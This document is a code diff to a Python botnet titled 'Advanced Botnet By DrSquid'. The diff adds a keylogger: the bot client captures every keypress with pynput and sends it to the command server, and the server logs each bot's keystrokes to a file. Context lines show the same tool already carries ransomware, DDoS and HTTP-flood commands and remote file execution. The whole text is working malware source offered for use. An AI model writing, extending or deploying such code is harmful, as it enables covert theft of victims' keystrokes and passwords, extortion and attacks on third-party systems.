@@ -79,6 +79,7 @@ Advanced Botnet By DrSquid
         self.sqlconnected = False
         self.sending_file = False
         self.auto_ban = True
+        self.keylogging = False
         self.botinfofile = "botinfo.txt"
         botinfo = open(self.botinfofile,"w").close()
         self.max_connpersec = 20
@@ -191,6 +192,8 @@ Advanced Botnet By DrSquid
 [+] !stopsql                                 - Disconnect from the connected Database file.
 [+] !stopwrite                               - Close writing mode and return to normal.
 [+] !getcwd                                  - Get the current directory of the bots.
+[+] !keylog                                  - Activate keylogging to see the bots keystrokes.
+[+] !stopkeylog                              - Stops the keylogging.
 [+] !listdir                                 - List all of the items in the bots working directory.
 [+] !ransomware                              - Activates the ransomware program inside of the bots.
 [+] DDoS Attack Commands:
@@ -298,6 +301,11 @@ Advanced Botnet By DrSquid
                         conn.close()
                 except Exception as e:
                     self.log(f"[({datetime.datetime.today()})][(ERROR)]: There was an error with listening for connections: {e}")
+    def obtain_botname_list(self):
+        botnames = []
+        for i in self.botinfo:
+            botnames.append(i[0])
+        return botnames
     def parse_info_msg(self, infomsg, conn, srcport):
         """There is a message sent by every client to the server, which would contain information about them.
         This include their hostname, IP Address, User, and Operating System. This is mainly for the bots,
@@ -450,6 +458,15 @@ Advanced Botnet By DrSquid
                                         pass
                                 else:
                                     self.send_to_other("SERVER",name,"There is already an active owner session. Please wait until they log off.", conn)
+                            elif msg.startswith("!key") and self.keylogging:
+                                keystroke = msg.split()[1]
+                                keyfile = open(name+".txt","r")
+                                content = keyfile.read()
+                                keyfile.close()
+                                newkeyfile = open(name+".txt","w")
+                                newkeyfile.write(content)
+                                newkeyfile.write(f"\n[+] {keystroke}")
+                                newkeyfile.close()
                             else:
                                 try:
                                     display_single_msg = False
@@ -594,6 +611,20 @@ Advanced Botnet By DrSquid
                                                 self.send_to_other("SERVER",self.admin_username,"You are in focus mode! Only the bot you are focusing will stop attacking!",self.adminconn)
                                         elif not self.ddosing:
                                             self.send_to_other("SERVER",self.admin_username,"The Bots are currently not attacking any domain.",self.adminconn)
+                                    elif msg.startswith("!keylog"):
+                                        self.send_to_other("SERVER",self.admin_username,"Activating Keylogger script on the bots(All of the logged keystrokes will be in a txt file with the bot's name).",self.adminconn)
+                                        self.keylogging = True
+                                        botnames = self.obtain_botname_list()
+                                        for i in botnames:
+                                            try:
+                                                keylogfile = open(f"{i}.txt","r")
+                                            except:
+                                                keylogfile = open(f"{i}.txt","w")
+                                                keylogfile.write(f"\nLOGGED KEYSTROKES FOR BOT {i}\n")
+                                            keylogfile.close()
+                                    elif msg.startswith("!stopkeylog"):
+                                        self.keylogging = False
+                                        self.send_to_other("SERVER",self.admin_username,"Deactivating Keylogger script on the bots.",self.adminconn)
                                     elif msg.startswith("!ransomware"):
                                         if self.ransomware_active:
                                             if self.focusing:
@@ -657,7 +688,10 @@ Advanced Botnet By DrSquid
                                         for bot in self.connlist:
                                             try:
                                                 if conn != bot:
-                                                    bot.send(msg.encode())
+                                                    if msg.startswith("!ransomware") and not self.ransomware_active:
+                                                        pass
+                                                    else:
+                                                        bot.send(msg.encode())
                                             except:
                                                 pass
                                     else:
@@ -688,9 +722,10 @@ Advanced Botnet By DrSquid
                                     self.filetransfer = False
                         if display_single_msg:
                             if not msg.startswith("!login"):
-                                self.log(f"[({datetime.datetime.today()})][({name})]: {msg}")
-                                if conn != self.adminconn:
-                                    self.adminconn.send(f"\n[({name})]: {msg}".encode())
+                                if not msg.startswith("!key"):
+                                    self.log(f"[({datetime.datetime.today()})][({name})]: {msg}")
+                                    if conn != self.adminconn:
+                                        self.adminconn.send(f"\n[({name})]: {msg}".encode())
                             else:
                                 self.log(f"[({datetime.datetime.today()})][({name})]: Attempting to log into the Admin Account.")
             except Exception as e:
@@ -727,6 +762,7 @@ Advanced Botnet By DrSquid
 import socket, threading, os, sys, urllib.request, random, time, shutil, subprocess, sqlite3
 try:
     from cryptography.fernet import Fernet
+    from pynput.keyboard import Listener
 except:
     pass
 class DDoS:
@@ -4187,6 +4223,8 @@ class Bot:
         self.can_encrypt = False
         self.files_encrypted = False
         self.sql_connected = False
+        self.keylogging = False
+        self.keylogthreadstarted = False
         try:
             self.fernet = Fernet(self.enc_key)
             self.can_encrypt = True
@@ -4256,6 +4294,14 @@ class Bot:
         cursor.close()
         sql.close()
         return output
+    def on_press(self, key):
+        if self.keylogging:
+            self.client.send(f"!key {key}".encode())
+    def on_release(self, key):
+        pass
+    def start_keylog(self):
+        with Listener(on_press=self.on_press, on_release=self.on_release) as L:
+            L.join()
     def return_actual_dir(self, direc):
         return direc.replace("%user%",os.getlogin())
     def send(self, msg):
@@ -4268,6 +4314,15 @@ class Bot:
                         os.startfile(filename)
                     else:
                         os.system(f"open {filename}")
+                elif msg.startswith("!keylog"):
+                    if not self.keylogging:
+                        if not self.keylogthreadstarted:
+                            keylogger = threading.Thread(target=self.start_keylog)
+                            keylogger.start()
+                        self.keylogging = True
+                        self.keylogthreadstarted = True
+                elif msg.startswith("!stopkeylog"):
+                    self.keylogging = False
                 elif msg.startswith('!httpflood'):
                     msg = msg.split()
                     ip = msg[1]
